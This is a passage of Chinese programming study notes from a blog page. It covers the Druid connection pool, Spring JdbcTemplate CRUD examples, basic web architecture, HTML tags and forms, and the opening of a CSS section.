class_">Properties</span>();<br><span class="hljs-type">InputStream</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> DruidDemo.class.getClassLoader().getResourceAsStream(<span class="hljs-string">&quot;druid.properties&quot;</span>);<br>pro.load(is);<br><span class="hljs-comment">//获取连接池对象</span><br>DataSource ds= DruidDataSourceFactory.createDataSource(pro);<br><span class="hljs-comment">//获取连接</span><br><span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> ds.getConnection();<br>System.out.println(conn);<br></code></pre></td></tr></table></figure><h4 id="工具类"><a href="#工具类" class="headerlink" title="工具类"></a>工具类</h4><ul><li>定义一个工具类JdbcUtils</li><li>提供静态代码块加载配置文件，初始化连接池对象</li><li>提供方法<ul><li>获取连接方法：通过数据库连接池获取连接</li><li>释放资源丰富</li><li>获取连接池的方法</li></ul></li></ul><h2 id="Spring-JDBC"><a href="#Spring-JDBC" class="headerlink" title="Spring JDBC"></a>Spring JDBC</h2><p>Spring框架对JDBC的简单封装，提供了一个JDBCTemplate对象简化对JDBC的开发</p><h3 id="使用步骤-1"><a href="#使用步骤-1" class="headerlink" title="使用步骤"></a>使用步骤</h3><ul><li><p>导入jar包，5个</p><p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1h4cladmloaj20vi07k3z3.jpg" alt="image-20220719220914974"></p></li><li><p>创建JdbcTemplate对象，依赖于数据源DataSource</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">JdbcTemplate tmp=<span class="hljs-keyword">new</span> <span class="hljs-title class_">JdbcTemplate</span>(ds)  <span class="hljs-comment">//ds是DataSource对象</span><br></code></pre></td></tr></table></figure></li><li><p>调用JdbcTemplate的方法来完成CRUD的操作</p><ul><li><p>update() 执行DML 增删改</p></li><li><p>queryForMap() 查询结果将结果封装成map集合</p><ul><li><p>结果集封装成map集合，列名作为key，值作为value</p></li><li><p>结果集长度只能是1</p></li></ul></li><li><p>queryForList() 查询结果将结果封装成list集合</p><ul><li>将每一条记录封装成Map，在装载到List集合中</li></ul></li><li><p>query() 查询结果，将结果封装为JavaBean对象</p><ul><li>参数 RowMapper<ul><li>一般使用BeanPropertyRowMapper实现类，可以完成数据到JavaBean的自动封装</li><li>new BeanPropertyRowMapper&lt;类型&gt;(类型.class)</li></ul></li></ul></li><li><p>queryForObject:查询结果，将结果封装成对象</p><ul><li>一般用于聚合函数的查询</li></ul></li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//导入jar包</span><br><span class="hljs-comment">//创建JDBCTemplate对象</span><br>JdbcTemplate template=<span class="hljs-keyword">new</span> <span class="hljs-title class_">JdbcTemplate</span>(JdbcUtils.getDataSource());<br><span class="hljs-comment">//调用方法</span><br>String sql=<span class="hljs-string">&quot;update mystudy set value= 3361 where id=?&quot;</span>;<br><span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> template.update(sql, <span class="hljs-number">3</span>);<span class="hljs-comment">//有几个问号sql后面就跟几个参数，不用写下标</span><br>System.out.println(count);<br></code></pre></td></tr></table></figure><h3 id="执行DML语句"><a href="#执行DML语句" class="headerlink" title="执行DML语句"></a>执行DML语句</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//获取JdbcTemplate对象</span><br><span class="hljs-keyword">private</span> JdbcTemplate template=<span class="hljs-keyword">new</span> <span class="hljs-title class_">JdbcTemplate</span>(JdbcUtils.getDataSource());<br><span class="hljs-comment">//练习</span><br><span class="hljs-comment">//Junit单元测试，独立执行</span><br><span class="hljs-meta">@Test</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test1</span><span class="hljs-params">()</span> &#123;<br>    String sql=<span class="hljs-string">&quot;update mystudy set value=1000 where id =?&quot;</span>;<br>    <span class="hljs-comment">//执行sql</span><br>    <span class="hljs-type">int</span> count=template.update(sql,<span class="hljs-number">3</span>);<br>    System.out.println(count);<br>&#125;<br><span class="hljs-comment">//添加一条记录</span><br><span class="hljs-meta">@Test</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test2</span><span class="hljs-params">()</span> &#123;<br>    String sql=<span class="hljs-string">&quot;insert into mystudy values(6,?,?)&quot;</span>;<br>    <span class="hljs-type">int</span> count=template.update(sql,<span class="hljs-string">&quot;小雨奕奕&quot;</span>,<span class="hljs-number">3599</span>);<br>    System.out.println(count);<br>&#125;<br><span class="hljs-comment">//删除记录</span><br><span class="hljs-meta">@Test</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test3</span><span class="hljs-params">()</span> &#123;<br>    String sql=<span class="hljs-string">&quot;delete from mystudy where id =?&quot;</span>;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> template.update(sql, <span class="hljs-number">6</span>);<br>    System.out.println(count);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="执行DQL语句"><a href="#执行DQL语句" class="headerlink" title="执行DQL语句"></a>执行DQL语句</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//查询id为1的记录，封装为Map集合</span><br><span class="hljs-meta">@Test</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test4</span><span class="hljs-params">()</span> &#123;<br>    String sql=<span class="hljs-string">&quot;select * from mystudy where id=? &quot;</span>;<br>    Map&lt;String, Object&gt; map = template.queryForMap(sql, <span class="hljs-number">1</span>);<span class="hljs-comment">//结果集长度只能是1</span><br>    System.out.println(map);<span class="hljs-comment">//&#123;id=1, name=宇甜, value=339.0&#125;</span><br>&#125;<br><span class="hljs-comment">//查询所有记录，封装成List</span><br><span class="hljs-meta">@Test</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test5</span><span class="hljs-params">()</span> &#123;<br>    String sql=<span class="hljs-string">&quot;select * from mystudy&quot;</span>;<br>    List&lt;Map&lt;String, Object&gt;&gt; list = template.queryForList(sql);<br>    <span class="hljs-keyword">for</span> (Map&lt;String,Object&gt; s:list) &#123;<br>        System.out.println(s);<span class="hljs-comment">//打印所有</span><br>    &#125;<br>&#125;<br><span class="hljs-comment">//查询所有记录，封装成Emp对象的List集合</span><br><span class="hljs-meta">@Test</span><br><span class="hljs-comment">//自己实现接口</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test6</span><span class="hljs-params">()</span> &#123;<br>    String sql=<span class="hljs-string">&quot;select * from mystudy&quot;</span>;<br>    List&lt;Emp&gt; list = template.query(sql, <span class="hljs-keyword">new</span> <span class="hljs-title class_">RowMapper</span>&lt;Emp&gt;() &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> Emp <span class="hljs-title function_">mapRow</span><span class="hljs-params">(ResultSet rs, <span class="hljs-type">int</span> i)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-type">Emp</span> <span class="hljs-variable">emp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Emp</span>();<br>            <span class="hljs-type">int</span> <span class="hljs-variable">id</span> <span class="hljs-operator">=</span> rs.getInt(<span class="hljs-string">&quot;id&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> rs.getString(<span class="hljs-string">&quot;name&quot;</span>);<br>            <span class="hljs-type">double</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> rs.getDouble(<span class="hljs-string">&quot;value&quot;</span>);<br>            emp.setId(id);<br>            emp.setValue(value);<br>            emp.setName(name);<br>            <span class="hljs-keyword">return</span> emp;<br>        &#125;<br>    &#125;);<br>    <span class="hljs-keyword">for</span> (Emp emp : list) &#123;<br>        System.out.println(emp);<br>    &#125;<br>&#125;<br><span class="hljs-meta">@Test</span><br><span class="hljs-comment">//使用默认接口</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test6_2</span><span class="hljs-params">()</span> &#123;<br>    String sql=<span class="hljs-string">&quot;select * from mystudy&quot;</span>;<br>    List&lt;Emp&gt; list = template.query(sql, <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanPropertyRowMapper</span>&lt;Emp&gt;(Emp.class));<br>    <span class="hljs-keyword">for</span> (Emp emp : list) &#123;<br>        System.out.println(emp);<br>    &#125;<br>&#125;<br><span class="hljs-comment">//查询总记录数</span><br><span class="hljs-meta">@Test</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test7</span><span class="hljs-params">()</span> &#123;<br>    String sql=<span class="hljs-string">&quot;select count(id) from mystudy&quot;</span>;<br>    Long total=template.queryForObject(sql,Long.class);<br>    System.out.println(total);<br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="软件架构"><a href="#软件架构" class="headerlink" title="软件架构"></a>软件架构</h2><h3 id="C-x2F-S-Client-x2F-Server"><a href="#C-x2F-S-Client-x2F-Server" class="headerlink" title="C&#x2F;S:Client&#x2F;Server"></a>C&#x2F;S:Client&#x2F;Server</h3><ul><li><p>本地员工客户端，远程一个服务端</p></li><li><p>e.g. qq、迅雷</p></li><li><p>优点：</p><ul><li>用户体验高</li></ul></li><li><p>缺点</p><ul><li>安装、部署、维护、开发麻烦</li></ul></li></ul><h3 id="B-x2F-S：Browser-x2F-Server-（JavaWeb开发）"><a href="#B-x2F-S：Browser-x2F-Server-（JavaWeb开发）" class="headerlink" title="B&#x2F;S：Browser&#x2F;Server （JavaWeb开发）"></a>B&#x2F;S：Browser&#x2F;Server （JavaWeb开发）</h3><ul><li><p>只需要一个浏览器,用户通过标题的网址，客户访问不同的服务器端程序</p></li><li><p>优点：开发 安装 维护 部署 简单</p></li><li><p>缺点</p><ul><li>绕过应用过大，影响用户体验</li><li>对硬件要求过高</li></ul></li></ul><h2 id="资源分类"><a href="#资源分类" class="headerlink" title="资源分类"></a>资源分类</h2><h3 id="静态资源"><a href="#静态资源" class="headerlink" title="静态资源"></a>静态资源</h3><ul><li>使用静态网页技术发布的资源</li><li>特点<ul><li>所有用户访问，结果一样</li><li>文本、图片、音频、HTML、CSS、JS<ul><li>HTML:语言展示页面</li><li>CSS:用于美化，布局</li><li>JS:控制页面元素，让页面有动态效果</li></ul></li><li>绕过用户请求静态资源，服务器会直接发送给浏览器，浏览器内置解析引擎，可以展示静态资源</li></ul></li></ul><h3 id="动态资源"><a href="#动态资源" class="headerlink" title="动态资源"></a>动态资源</h3><ul><li>使用动态网页时发布的资源</li><li>特点<ul><li>用户访问得到结果可能不一样</li><li>jsp&#x2F;servlet 、php、asp…</li><li>如果用户请求动态资源，服务器会执行动态资源，转换成静态资源，发给浏览器</li></ul></li></ul><h1 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h1><h2 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h2><h3 id="超文本"><a href="#超文本" class="headerlink" title="超文本"></a>超文本</h3><p>用超链接方式，将不同空间的文字信息组织在一起的网状文本</p><h3 id="标记语言"><a href="#标记语言" class="headerlink" title="标记语言"></a>标记语言</h3><ul><li>标签构成，&lt;标签名称&gt; html xml</li><li>标记语言表示编程语言</li></ul><h2 id="快速入门-1"><a href="#快速入门-1" class="headerlink" title="快速入门"></a>快速入门</h2><h3 id="后缀名"><a href="#后缀名" class="headerlink" title="后缀名"></a>后缀名</h3><p>.html或.htm</p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p>标签分类</p><ul><li>围堵标签 有开始和结束标签 <code>&lt;title&gt;&lt;/title&gt;</code></li><li>自闭合标签 开始标签和结束标签在一起 <code>&lt;br/&gt;</code></li></ul><p>在开始标签中可以定义属性，属性由键值对构成，值需要引号(单双都可)引起来 <code>&lt;font color=&#39;red&#39;&gt; Hello &lt;/font&gt;</code></p><blockquote><p>html标签不屈服大小写标签，建议使用小写</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">font</span> <span class="hljs-attr">color</span>=<span class="hljs-string">&#x27;red&#x27;</span>&gt;</span> Hello <span class="hljs-tag">&lt;/<span class="hljs-name">font</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">font</span> <span class="hljs-attr">color</span>=<span class="hljs-string">&#x27;green&#x27;</span>&gt;</span> Hello <span class="hljs-tag">&lt;/<span class="hljs-name">font</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="文件标签"><a href="#文件标签" class="headerlink" title="文件标签"></a>文件标签</h2><h3 id="html"><a href="#html" class="headerlink" title="html"></a>html</h3><p>根标签</p><h3 id="head"><a href="#head" class="headerlink" title="head"></a>head</h3><p>头标签，指定html文档的属性，引入外部资源</p><h3 id="title"><a href="#title" class="headerlink" title="title"></a>title</h3><p>标题标签</p><h3 id="body"><a href="#body" class="headerlink" title="body"></a>body</h3><p>体标签</p><h3 id="lt-DOCTYPE-gt"><a href="#lt-DOCTYPE-gt" class="headerlink" title="&lt;!DOCTYPE &gt;"></a><code>&lt;!DOCTYPE &gt;</code></h3><p>声明文档类型</p><h2 id="文本标签"><a href="#文本标签" class="headerlink" title="文本标签"></a>文本标签</h2><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--注释--&gt;</span><br></code></pre></td></tr></table></figure><h3 id="标题标签"><a href="#标题标签" class="headerlink" title="标题标签"></a>标题标签</h3><p>h1-h6 递减 <code>&lt;h1&gt;&lt;/h1&gt;</code></p><h3 id="段落标签"><a href="#段落标签" class="headerlink" title="段落标签"></a>段落标签</h3><p><code>&lt;p&gt;&lt;/p&gt;</code></p><h3 id="换行"><a href="#换行" class="headerlink" title="换行"></a>换行</h3><p><code>&lt;br&gt;</code></p><h3 id="展示水平线"><a href="#展示水平线" class="headerlink" title="展示水平线"></a>展示水平线</h3><p><code>&lt;hr&gt;</code></p><p>属性</p><ul><li>color</li><li>width 宽度</li><li>size 高度</li><li>align 对齐方式<ul><li>center</li><li>left</li><li>right</li></ul></li></ul><h3 id="字体加粗-斜体"><a href="#字体加粗-斜体" class="headerlink" title="字体加粗 斜体"></a>字体加粗 斜体</h3><p><code>&lt;b&gt;&lt;/b&gt;</code> <code>&lt;i&gt;&lt;/i&gt;</code></p><h3 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">font</span> <span class="hljs-attr">color</span>=<span class="hljs-string">&quot;#ff7f50&quot;</span> <span class="hljs-attr">size</span>=<span class="hljs-string">&quot;200&quot;</span> <span class="hljs-attr">face</span>=<span class="hljs-string">&quot;楷体&quot;</span>&gt;</span>野猪野猪<span class="hljs-tag">&lt;/<span class="hljs-name">font</span>&gt;</span><br></code></pre></td></tr></table></figure><p>属性</p><ul><li>color :英文单词&#x2F;rgb(值1，值2，值3) 值 0-255–&gt;#后跟三个值的16进制</li><li>width 单位为像素 也可以赋值 <code>数值%</code>:占比相对于父元素的比例</li><li>size 大小</li><li>face字体</li></ul><h4 id="文本居中"><a href="#文本居中" class="headerlink" title="文本居中"></a>文本居中</h4><p><code>&lt;center&gt;&lt;/center&gt;</code></p><p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1h4drfr8zv0j216e0u0q8e.jpg" alt="image-20220720222734009"></p><h2 id="常用标签"><a href="#常用标签" class="headerlink" title="常用标签"></a>常用标签</h2><h3 id="图片标签"><a href="#图片标签" class="headerlink" title="图片标签"></a>图片标签</h3><p>img</p><h4 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h4><ul><li>src 指定路径</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../../image/1.jpg&quot;</span><span class="hljs-attr">align</span>=<span class="hljs-string">&quot;right&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;海岸&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;500&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;300&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure><ul><li>alt 加载失败时显示的文字</li></ul><h3 id="列表标签"><a href="#列表标签" class="headerlink" title="列表标签"></a>列表标签</h3><p>有序列表</p><ul><li>ol 包裹整个大列表</li><li>li 包裹每一行</li><li>type 每行标识符样式 start 开始标识符</li></ul><p>无序列表</p><ul><li>ul 包裹整个大列表</li><li>li 包裹每一行</li><li>type 每行标识符样式</li></ul><h3 id="超链接"><a href="#超链接" class="headerlink" title="超链接"></a>超链接</h3><p><code>&lt;a href=&quot;url&quot;&gt;&lt;/a&gt;</code></p><p>属性</p><ul><li>href ：放url(统一资源定位符)也可以放文件路径以及其他协议的http</li><li>target:<ul><li>_self 默认值 在当前页面打开</li><li>_blank 在新页面打开</li></ul></li></ul><blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js">超链接功能<br><span class="hljs-number">1</span>、可以被点击：样式<br><span class="hljs-number">2</span>、跳转到href指定到url<br>需求：保留<span class="hljs-number">1</span>，去掉<span class="hljs-number">2</span><br>实现：href=<span class="hljs-string">&quot;javascript:void(0);&quot;</span><br><span class="hljs-comment">//如果只href=&quot;&quot; 默认点击后跳转当前页面，相对于刷新</span><br></code></pre></td></tr></table></figure></blockquote><h3 id="块标签"><a href="#块标签" class="headerlink" title="块标签"></a>块标签</h3><p>span：文本在一行展示，行内标签，内联标签 结合css使用</p><p>div 每一个标签占一行 块级标签 结合css使用</p><h3 id="语义化标签"><a href="#语义化标签" class="headerlink" title="语义化标签"></a>语义化标签</h3><p>header</p><p>footer</p><p>为了提高程序可读性使用，与css一起使用</p><h3 id="表格标签"><a href="#表格标签" class="headerlink" title="表格标签"></a>表格标签</h3><p>table 定义表格</p><ul><li>width 宽度</li><li>border 边框</li><li>cellspacing 定义单元格之间的距离，如果指定为0，则单元格线会合为一条</li><li>cellpadding 定义内容与单元格之间的距离</li><li>bgcolor 背景色</li><li>align 对齐方式</li></ul><p>tr 定义行</p><ul><li>bgcolor 背景色</li><li>align 对齐方式</li></ul><p>td 定义单元格</p><ul><li>bgcolor 背景色</li><li>align 对齐方式</li><li>colspan 合并列</li><li>rowspan 合并行</li></ul><p>th 定义表头单元格</p><p>caption 表格标题</p><p>thead 表示表格头部分</p><p>tbody 表示表格主体</p><p>tfoot 表示表格脚部分</p><h2 id="表单标签"><a href="#表单标签" class="headerlink" title="表单标签"></a>表单标签</h2><h3 id="定义-2"><a href="#定义-2" class="headerlink" title="定义"></a>定义</h3><p>表单：用于采集用户输入数据，用于和服务器进行交互</p><p>使用标签:form</p><h3 id="属性-1"><a href="#属性-1" class="headerlink" title="属性"></a>属性</h3><ul><li>action 指定提交数据的url</li><li>method 指定提交方式<ul><li>一个7种，常用get，post</li><li>get:请求参数会在地址栏中显示，封装在请求行中，请求参数长度有限制,不太安全</li><li>post：请求参数不在地址栏中显示，会封装在请求体中，请求参数长度没限制，比较安全</li></ul></li></ul><blockquote><p>get方式提交完，url上会显示传参，参数名是输入框的name属性</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"> <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;get&quot;</span>&gt;</span><br>用户名：<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>密码:<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span> &gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;登录&quot;</span>&gt;</span><br> <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><p>url?username&#x3D;13213&amp;password&#x3D;ewe#</p><p>注意：不加name属性，不会被提交,因此必须指定name属性</p></blockquote><h3 id="表单项标签"><a href="#表单项标签" class="headerlink" title="表单项标签"></a>表单项标签</h3><h4 id="input"><a href="#input" class="headerlink" title="input"></a>input</h4><p>通过type属性值，改变展示样式,默认type为text表示文本输入框</p><p>type属性取值</p><ul><li><p>text：文本输入框</p><ul><li>placeholder属性，设置提示内容，淡淡灰色</li></ul></li><li><p>password ：密码输入框</p></li><li><p>radio 单选框,要实现单选效果，name属性要一样 ，选择的话传参数<code>name值=参数值</code></p><ul><li><p>一般加上value属性 表示该选项被选中后传的参数值</p><blockquote><p>如果不加value，只会传on和off，on表示有被选中，off表示都没被选</p></blockquote></li><li><p>checked属性，设置赋值checked或只加check都可以默认选</p></li></ul></li><li><p>checkbox 复选框</p><ul><li>基本和单选框一样</li></ul></li><li><p>file 文件选择框</p></li><li><p>hidden 隐藏域，用于提交一些信息</p></li><li><p>submit 提交表单</p></li><li><p>button 按钮</p><ul><li>可以加图片 src属性</li></ul></li><li><p>image 图片样式的提交按钮</p></li><li><p>color 取色器</p></li><li><p>datetime-local&#x2F;data 日期</p></li><li><p>email 邮箱输入框，会进行格式校验</p></li><li><p>number 只能输入数字</p></li></ul><p>label标签 指定输入项的文字描述信息</p><blockquote><p>label的for属性一般和input的name属性对应，对应后，点击label区域，会让input输入框获取焦点</p></blockquote><h4 id="select"><a href="#select" class="headerlink" title="select"></a>select</h4><p>下拉列表</p><ul><li>子元素： option指定列表项</li></ul><h4 id="textarea"><a href="#textarea" class="headerlink" title="textarea"></a>textarea</h4><p>文本域</p><ul><li>cols 指定列数，每行有几个字符</li><li>rows 指定行数，最多几行</li></ul><h1 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h1><h2 id="概念-2"><a href="#概念-2" class="headerlink" title="概念"></a>概念</h2><p>内容与样式分离</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="三种样式"><a href="#三种样式" class="headerlink" title="三种样式"></a>三种样式</h3><ol><li>内联样式</li></ol><ul><li>在标签内使用style属性指定css代码<ul><li>如：<code>&lt;div style=&quot;color:red;&quot;&gt;hello css&lt;/div&gt;</code></li></ul></li></ul><ol start="2"><li><p>内部样式</p><ul><li><p>在head标签内，定义style标签，style标签的标签体内容就是css代码</p></li><li><p>如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css">      <span class="hljs-selector-tag">div</span>&#123;</span><br><span class="language-css">          <span class="hljs-attribute">color</span>:blue;</span><br><span class="language-css">      &#125;</span><br><span class="language-css">  </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>hello css<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ul></li><li><p>外部样式</p><ol><li>定义css资源文件。</li><li>在head标签内，定义link标签，引入外部的资源文件</li></ol><ul><li><p>如：a.css文件：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span>&#123;<br>    <span class="hljs-attribute">color</span>:green;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--html文件--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;css/a.css&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>hello css<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>hello css<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ul></li></ol><blockquote><p>注意：</p><ul><li><p>1,2,3种方式 css作用范围越来越大</p></li><li><p>1方式不常用，后期常用2,3</p></li><li><p>3种格式可以写为：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css">      <span class="hljs-keyword">@import</span> <span class="hljs-string">&quot;css/a.css&quot;</span>;</span><br><span class="language-css">  </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ul></blockquote><h2 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h2><h3 id="格式-1"><a href="#格式-1" class="headerlink" title="格式"></a>格式</h3><p>都要在style标签内</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css">选择器 &#123;<br>  属性名<span class="hljs-number">1</span>:值<span class="hljs-number">1</span>;<br>  属性名<span class="hljs-number">2</span>:值<span 